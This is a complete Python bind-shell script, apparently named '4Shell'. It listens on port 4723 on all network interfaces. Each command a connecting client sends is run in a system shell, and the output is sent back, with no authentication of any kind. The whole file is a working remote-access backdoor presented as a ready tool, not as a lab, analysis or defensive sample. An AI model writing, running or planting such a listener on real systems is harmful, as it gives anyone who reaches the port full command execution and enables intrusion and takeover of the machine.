import socket
import subprocess
import sys
import os
 
def Main():
    host = "0.0.0.0"
    port = 4723
     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    try:
        s.bind((host,port))
        s.listen(5)
        print("[\033[032m OK \033[00m] Binding server at %s:%s on %s" % (host, port, os.uname()[1]))
    except PermissionError:
        print("\033[00m[\033[033m ERROR \033[00m] Exiting the shell. \n\t[\033[033m Err \033[00m: Permission Denied! ]")
        sys.exit()
    except OSError as e:
        if e.args[0] == 98:
            print("\033[00m[\033[033m ERROR \033[00m] Exiting the shell. \n\t[\033[033m Err \033[00m: Address already in use! ]")
            sys.exit()
    conn, addr = s.accept()
    print ("[\033[032m OK \033[00m] 4Shell connected with: %s" % str(addr[0]))
    while True:
        try:
            data = conn.recv(4096).decode()
        except KeyboardInterrupt:
            print("\n\033[00m[\033[033m ERROR \033[00m] Exiting the shell. \n\t[\033[033m Err \033[00m: Keyboard Interrupt! ]")
            sys.exit()
        if not data: break
        data = str(data)
        response = shell(data)
        try:
            conn.send(response.strip().encode())
        except ConnectionResetError:
            print("\033[00m[\033[031m ERROR \033[00m] Connection Closed. Try Again!")
            sys.exit()
def shell(command):
    command = command.rstrip()
    try:
        if command[0:2] == 'cd':
            try:
                os.chdir(command[3:])
            except FileNotFoundError:
                print("No such file or directory: %s" % command[3:])
            run = os.getcwd()
        else:
            run = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, encoding='utf-8')
    except subprocess.CalledProcessError:
        run = "\033[00m[\033[031m-\033[00m] Command not found"
    except:
        run = "\033[00m[\033[031m-\033[00m] Failed to execute command"
    return run
if __name__ == '__main__':
    Main()
